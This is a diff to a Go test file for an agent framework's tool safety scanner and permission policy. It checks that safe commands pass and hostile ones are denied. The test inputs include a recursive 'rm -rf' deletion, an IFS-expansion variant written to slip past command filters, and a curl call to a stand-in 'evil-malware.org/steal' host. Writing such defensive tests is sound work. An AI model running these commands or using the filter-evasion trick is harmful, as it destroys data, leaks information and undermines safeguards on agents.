@@ -10,7 +10,10 @@
 package main
 
 import (
+	"context"
 	"testing"
+
+	"trpc.group/trpc-go/trpc-agent-go/tool"
 )
 
 func TestToolSafetyGuard(t *testing.T) {
@@ -24,18 +27,40 @@ func TestToolSafetyGuard(t *testing.T) {
 	}
 
 	scanner := NewScanner(policy)
+	guard := NewSafetyPermissionPolicy(scanner, "")
 
-	t.Run("Safe_Command_Allowed", func(t *testing.T) {
-		res := scanner.ScanCommand("workspace_exec", "go test ./...", "workspaceexec")
-		if res.Decision != "allow" {
-			t.Errorf("Expected allow, got %s", res.Decision)
+	t.Run("CheckToolPermission_Interface_Allow", func(t *testing.T) {
+		req := &tool.PermissionRequest{
+			ToolName:  "workspace_exec",
+			Arguments: []byte("go test ./..."),
+		}
+		decision, err := guard.CheckToolPermission(context.Background(), req)
+		if err != nil {
+			t.Fatalf("Unexpected error: %v", err)
+		}
+		if decision.Action != tool.PermissionActionAllow {
+			t.Errorf("Expected allow, got %v", decision.Action)
 		}
 	})
 
-	t.Run("Dangerous_Deletion_Denied", func(t *testing.T) {
-		res := scanner.ScanCommand("workspace_exec", "rm -rf /tmp/data", "workspaceexec")
-		if res.Decision != "deny" || res.RuleID != "RULE_DANGEROUS_DELETION" {
-			t.Errorf("Expected deny RULE_DANGEROUS_DELETION, got %s (%s)", res.Decision, res.RuleID)
+	t.Run("CheckToolPermission_Interface_Deny", func(t *testing.T) {
+		req := &tool.PermissionRequest{
+			ToolName:  "workspace_exec",
+			Arguments: []byte("rm -rf /tmp/data"),
+		}
+		decision, err := guard.CheckToolPermission(context.Background(), req)
+		if err != nil {
+			t.Fatalf("Unexpected error: %v", err)
+		}
+		if decision.Action != tool.PermissionActionDeny {
+			t.Errorf("Expected deny, got %v", decision.Action)
+		}
+	})
+
+	t.Run("Shell_IFS_Expansion_Bypass_Denied", func(t *testing.T) {
+		res := scanner.ScanCommand("workspace_exec", "rm${IFS}-rf${IFS}/tmp/data", "workspaceexec")
+		if res.Decision != "deny" || res.RuleID != "RULE_SHELL_EXPANSION_BYPASS" {
+			t.Errorf("Expected deny RULE_SHELL_EXPANSION_BYPASS, got %s (%s)", res.Decision, res.RuleID)
 		}
 	})
 
@@ -50,13 +75,6 @@ func TestToolSafetyGuard(t *testing.T) {
 		res := scanner.ScanCommand("workspace_exec", "curl https://evil-malware.org/steal", "workspaceexec")
 		if res.Decision != "deny" || res.RuleID != "RULE_UNAPPROVED_NETWORK_EGRESS" {
 			t.Errorf("Expected deny RULE_UNAPPROVED_NETWORK_EGRESS, got %s (%s)", res.Decision, res.RuleID)
-		}
-	})
-
-	t.Run("Approved_Egress_Allowed", func(t *testing.T) {
-		res := scanner.ScanCommand("workspace_exec", "curl https://api.github.com/repos", "workspaceexec")
-		if res.Decision != "allow" {
-			t.Errorf("Expected allow, got %s", res.Decision)
 		}
 	})
 }
